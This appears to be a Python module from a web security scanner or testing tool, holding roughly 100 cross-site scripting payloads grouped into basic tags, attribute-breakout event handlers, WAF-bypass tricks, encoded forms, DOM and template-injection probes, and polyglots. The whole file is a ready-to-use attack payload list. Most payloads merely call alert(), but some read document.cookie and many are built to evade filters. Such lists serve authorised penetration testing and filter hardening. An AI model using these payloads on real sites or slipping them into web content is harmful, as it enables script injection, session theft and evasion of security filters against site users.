"""XSS Payload库 - 80+ Payloads"""

XSS_BASIC = [
    '<script>alert(1)</script>',
    '<script>alert("XSS")</script>',
    '<script>alert(document.domain)</script>',
    '<script>alert(document.cookie)</script>',
    '<img src=x onerror=alert(1)>',
    '<img/src=x onerror=alert(1)>',
    '<img src=x onerror="alert(1)">',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">click</a>',
    '<form action="javascript:alert(1)"><input type=submit>',
    '<isindex action="javascript:alert(1)" type=submit>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>',
    '<frameset onload=alert(1)>',
    '<table background="javascript:alert(1)">',
    '<div style="background:url(javascript:alert(1))">',
]

XSS_EVENT_HANDLERS = [
    '" onclick=alert(1)//',
    '" onmouseover=alert(1)//',
    '" onfocus=alert(1) autofocus//',
    '" onerror=alert(1)//',
    '" onload=alert(1)//',
    '" onanimationend=alert(1)//',
    '" onbegin=alert(1)//',
    '" ondrag=alert(1)//',
    '" ondragend=alert(1)//',
    '" ondragenter=alert(1)//',
    '" ondragleave=alert(1)//',
    '" ondragover=alert(1)//',
    '" ondragstart=alert(1)//',
    '" ondrop=alert(1)//',
    '" onkeydown=alert(1)//',
    '" onkeypress=alert(1)//',
    '" onkeyup=alert(1)//',
    '" onmousedown=alert(1)//',
    '" onmouseenter=alert(1)//',
    '" onmouseleave=alert(1)//',
    '" onmousemove=alert(1)//',
    '" onmouseout=alert(1)//',
    '" onmouseup=alert(1)//',
    "' onmouseover='alert(1)",
]

XSS_WAF_BYPASS = [
    '<ScRiPt>alert(1)</sCrIpT>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<scr%00ipt>alert(1)</scr%00ipt>',
    '<scr\nipt>alert(1)</scr\nipt>',
    '</script><script>alert(1)</script>',
    '<svg><script>alert&#40;1&#41;</script></svg>',
    '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
    '<img src=x onerror=[].constructor.constructor("alert(1)")()>',
    '<img src=x onerror=window["alert"](1)>',
    '<img src=x onerror=self["alert"](1)>',
    '<img src=x onerror=top["alert"](1)>',
    '<img src=x onerror=this["alert"](1)>',
    '<img src=x onerror=parent["alert"](1)>',
    '"><img src=x onerror=alert(String.fromCharCode(88,83,83))>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">click',
    '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">X</a>',
]

XSS_ENCODED = [
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    '<script>\\u0061lert(1)</script>',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '%253Cscript%253Ealert(1)%253C/script%253E',
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
    '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
    '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
]

XSS_DOM = [
    'javascript:alert(document.domain)',
    '#<script>alert(1)</script>',
    '#"><img src=x onerror=alert(1)>',
    '"-alert(1)-"',
    '${alert(1)}',
    '{{constructor.constructor("alert(1)")()}}',
    '{{7*7}}',  # SSTI检测
]

XSS_POLYGLOT = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
    "'\"-->]]>*/</script></style></title></textarea></noscript><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    "-->'\"</Style></Script><Script>alert(1)</Script>",
    "'\"--></title></textarea></style></script><svg/onload=alert(1)>",
]

ALL_XSS = XSS_BASIC + XSS_EVENT_HANDLERS + XSS_WAF_BYPASS + XSS_ENCODED + XSS_DOM + XSS_POLYGLOT
